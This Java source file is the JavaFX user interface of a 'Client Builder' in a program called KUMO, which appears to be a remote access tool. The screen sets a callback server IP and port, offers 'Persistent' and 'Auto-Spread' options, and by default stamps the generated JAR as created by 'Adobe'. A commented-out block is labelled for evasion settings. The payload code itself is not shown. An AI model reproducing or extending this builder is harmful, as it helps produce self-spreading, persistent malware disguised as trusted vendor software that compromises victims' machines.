package GUI.Views;


import GUI.Components.BottomBar;
import GUI.Components.TopBar;
import GUI.Styler;
import KUMO.ClientBuilder;
import Logger.Level;
import Logger.Logger;
import Server.Data.PseudoBase;
import Server.KumoSettings;
import javafx.geometry.Insets;
import javafx.scene.control.*;
import javafx.scene.layout.BorderPane;
import javafx.scene.layout.GridPane;
import javafx.scene.layout.HBox;
import javafx.scene.layout.Priority;

import java.io.IOException;

class ClientBuilderView {

    private CheckBox persistent;
    private CheckBox autoSpread;
    private CheckBox debug;
    private TextField jarCreatedBy;
    private TextField jarVersion;
    private TextField updateTime;

    BorderPane getClientBuilderView() {
        BorderPane borderPane = new BorderPane();
        borderPane.getStylesheets().add(getClass().getResource("/css/global.css").toExternalForm());
        borderPane.setTop(new TopBar().getTopBar(KUMO.Kumo.getPrimaryStage()));
        borderPane.setLeft(clientBuilderSettingsLeft());
        borderPane.setRight(jarSettingsRight());
        borderPane.setCenter(clientBuilderSettingsCenter());
        borderPane.setBottom(new BottomBar().getBottomBar());
        return borderPane;
    }

    private HBox jarSettingsRight(){
        HBox hbox = Styler.hContainer(20);
        hbox.getStylesheets().add(getClass().getResource("/css/global.css").toExternalForm());
        HBox.setHgrow(hbox, Priority.ALWAYS);
        hbox.setId("clientBuilder");
        hbox.setPadding(new Insets(75, 20, 20, 20));
        // Created-By
        Label createdByLabel = (Label) Styler.styleAdd(new Label("Created By: "), "label-bright");
        jarCreatedBy = new TextField();

        // Version
        Label jarVersionLabel = (Label) Styler.styleAdd(new Label("Version: "), "label-bright");
        jarVersion = new TextField();

        TitledPane jarSettings = (TitledPane) Styler.styleAdd(new TitledPane(), "label-bright");
        GridPane grid = new GridPane();
        grid.setId("java-settings");
        grid.setVgap(4);
        grid.setPadding(new Insets(5, 5, 5, 5));

        // Add elements to grid
        grid.add(createdByLabel, 0,0);
        grid.add(jarCreatedBy, 1, 0);
        grid.add(jarVersionLabel, 0, 1);
        grid.add(jarVersion, 1, 1);

        jarSettings.setLayoutY(10);
        jarSettings.setText("JAR Settings");
        jarSettings.setExpanded(false);
        jarSettings.setAnimated(true);
        jarSettings.setContent(grid);

       /* // Evasion, custom networking
        Label updateTimeLabel = (Label) Styler.styleAdd(new Label("Update Time: "), "label-bright");
        updateTime = new TextField("30");

        TitledPane networkSettings = (TitledPane) Styler.styleAdd(new TitledPane(), "label-bright");
        GridPane netGrid = new GridPane();
        grid.setId("java-settings");
        grid.setVgap(4);
        grid.setPadding(new Insets(5));
        grid.add(updateTimeLabel, 0, 0);
        grid.add(updateTime, 1, 0);

        networkSettings.setLayoutY(10);
        networkSettings.setText("Networking Settings");
        networkSettings.setExpanded(false);
        networkSettings.setAnimated(true);
        networkSettings.setContent(grid);*/

        hbox.getChildren().add(Styler.vContainer(20, jarSettings));//, networkSettings));
        return hbox;
    }

    private HBox clientBuilderSettingsLeft() {
        HBox hBox = Styler.hContainer(20);
        hBox.getStylesheets().add(getClass().getResource("/css/global.css").toExternalForm());
        hBox.setId("clientBuilder");
        hBox.setPadding(new Insets(20, 20, 20, 20));
        Label title = (Label) Styler.styleAdd(new Label("Client Builder"), "title");
        persistent = new CheckBox("Persistent");
        autoSpread = new CheckBox("Auto-Spread");
        debug = new CheckBox("Debug Mode");
        hBox.getChildren().add(Styler.vContainer(20, title, persistent, autoSpread, debug));
        return hBox;
    }

    private HBox clientBuilderSettingsCenter() {
        HBox hBox = Styler.hContainer(20);
        hBox.getStylesheets().add(getClass().getResource("/css/global.css").toExternalForm());
        hBox.setId("clientBuilder");
        hBox.setPadding(new Insets(20, 20, 20, 20));
        Label title = (Label) Styler.styleAdd(new Label(" "), "title");

        Label serverIPLabel = (Label) Styler.styleAdd(new Label("Server IP: "), "label-bright");
        TextField serverIP = new TextField("" + KumoSettings.CONNECTION_IP);
        HBox serverIPBox = Styler.hContainer(serverIPLabel, serverIP);
        serverIP.setEditable(true);

        Label portLabel = (Label) Styler.styleAdd(new Label("Port: "), "label-bright");
        TextField port = new TextField("" + KumoSettings.PORT);
        HBox portBox = Styler.hContainer(portLabel, port);
        port.setEditable(true);
        port.textProperty().addListener(((observable, oldValue, newValue) -> {
            if (!newValue.matches("\\d*")) {
                port.setText(newValue.replaceAll("[^\\d]", ""));
            }
        }));

        Label clientNameLabel = (Label) Styler.styleAdd(new Label("Client Name: "), "label-bright");
        TextField clientName = new TextField("Client");
        HBox clientNameBox = Styler.hContainer(clientNameLabel, clientName);
        clientName.setEditable(true);


        Button buildClient = new Button("Build");
        buildClient.setPrefWidth(150);
        buildClient.setPrefHeight(50);
        buildClient.setOnAction(event -> {
            if ((!serverIP.getText().equals("")) && !serverIP.getText().equals(KumoSettings.CONNECTION_IP)) {
                KumoSettings.CONNECTION_IP = (serverIP.getText());
            }
            if ((!port.getText().equals("")) && Integer.parseInt(port.getText()) != KumoSettings.PORT) {
                KumoSettings.PORT = (Integer.parseInt(port.getText()));
            }
            try {
                if (autoSpread.isSelected()) {
                    ClientBuilder.autoSpread = true;
                }
                if (persistent.isSelected()) {
                    ClientBuilder.isPersistent = true;
                }
                if (debug.isSelected()){
                    ClientBuilder.isDebug = true;
                }
                PseudoBase.writeKumoData();
            } catch (IOException e) {
                Logger.log(Level.ERROR, e.toString());
            }
            if ((!clientName.getText().equals(""))) {
                ClientBuilder clientBuilder = new ClientBuilder(clientName.getText());
                try {
                    clientBuilder.run();
                } catch (IOException e) {
                    Logger.log(Level.ERROR, e.toString());
                }
            }
            if ((!jarCreatedBy.getText().equals(""))){
                ClientBuilder.jarCreatedBy = jarCreatedBy.getText();
            } else {
                ClientBuilder.jarCreatedBy = "Adobe";
            }
            if ((!jarVersion.getText().equals(""))){
                ClientBuilder.jarVersion = jarVersion.getText();
            }
        });


        hBox.getChildren().add(Styler.vContainer(20, title, serverIPBox, portBox, clientNameBox, buildClient));
        HBox.setHgrow(hBox, Priority.ALWAYS);
        return hBox;
    }
}
